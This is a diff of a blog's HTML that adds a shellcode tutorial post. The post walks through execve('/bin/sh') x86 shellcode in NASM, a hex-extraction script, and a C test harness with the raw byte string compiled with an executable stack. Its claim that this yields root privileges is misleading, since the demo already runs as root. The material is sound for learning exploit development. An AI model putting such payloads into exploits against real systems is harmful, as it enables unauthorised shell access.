@@ -158,6 +158,102 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2011/10/16/shellcodewrite/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2011/10/16/shellcodewrite/" class="post-title-link" itemprop="url">Shellcode Written in Linux</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2011-10-16 11:54:47" itemprop="dateCreated datePublished" datetime="2011-10-16T11:54:47-04:00">2011-10-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-17 12:05:08" itemprop="dateModified" datetime="2023-10-17T12:05:08-04:00">2023-10-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/shellcode/" itemprop="url" rel="index"><span itemprop="name">shellcode</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Before you start learning shellcode development, please install NASM on your Linux system. Here’s the shellcode code:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">jmp short callShellcode</span><br><span class="line"></span><br><span class="line">shellcode:</span><br><span class="line"></span><br><span class="line">pop esi                     ; Pop <span class="string">&#x27;/bin/sh&#x27;</span> from the stack into esi</span><br><span class="line">xor eax, eax                ; Set eax to NULL</span><br><span class="line">mov byte [esi + 7], al      ; Null-terminate <span class="string">&#x27;/bin/sh&#x27;</span> using the low byte of eax</span><br><span class="line">lea ebx, [esi]              ; Load the address of <span class="string">&#x27;/bin/sh&#x27;</span> into ebx</span><br><span class="line">mov dword [esi + 8], ebx</span><br><span class="line">lea ecx, [esi + 8]          ; Load the address of the argv array into ecx</span><br><span class="line">mov dword [esi + 12], eax</span><br><span class="line">lea edx, [esi + 12]         ; Load the address of the NULL terminator into edx</span><br><span class="line">mov al, 0x0b               ; Set al to 0x0b, the system call number <span class="keyword">for</span> execve</span><br><span class="line">int 0x80                   ; Trigger the syscall</span><br><span class="line"></span><br><span class="line">callShellcode:</span><br><span class="line"></span><br><span class="line">call shellcode</span><br><span class="line">db <span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>After saving this code to a file named “shellx.asm,” you need to compile it using NASM to obtain the hexadecimal representation of the code. Use the following commands:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf shellx.asm</span><br><span class="line">ld -o shellx shellx.o -m elf_i386</span><br></pre></td></tr></table></figure>
+
+<p>This will generate a “shellx” file. However, it’s not executable yet. You’ll need to use the “objdump” command to extract the hexadecimal code. You can use a Bash script like this:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(objdump -d <span class="string">&quot;<span class="variable">$1</span>&quot;</span> | <span class="built_in">tr</span> <span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27; &#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;\n&#x27;</span> | egrep <span class="string">&#x27;^[0-9a-f]&#123;2&#125;$&#x27;</span>); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;\x<span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>To validate your assembly code, you’ll need a C program as follows:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">char code[] = <span class="string">&quot;\xeb\x18\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x8d\x4e\x08\x89\x46\x0c\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68&quot;</span>;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    int (*func)();</span><br><span class="line">    func = (int (*)()) code;</span><br><span class="line">    (int)(*func)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Compile this code with the following command:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o shellcodetest shellcodetest.c -m32 -z execstack</span><br></pre></td></tr></table></figure>
+
+<p>This will produce an executable, “shellcodetest.” When you run it, you’ll get a shell with root privileges:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/shellCode_train<span class="comment"># ./shellcodetest</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">    exit.asm     hello     shellcodetest    shellx.asm</span><br><span class="line">    exit.o       hello.asm  shellcodetest.c  shellx.o</span><br><span class="line">    getshellcode.sh  hello.o    shellx</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">    root</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2011/03/02/nasmCompile/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1065,13 +1161,13 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-count">40</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">50</span>
+        <span class="site-state-item-count">53</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -1105,7 +1201,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
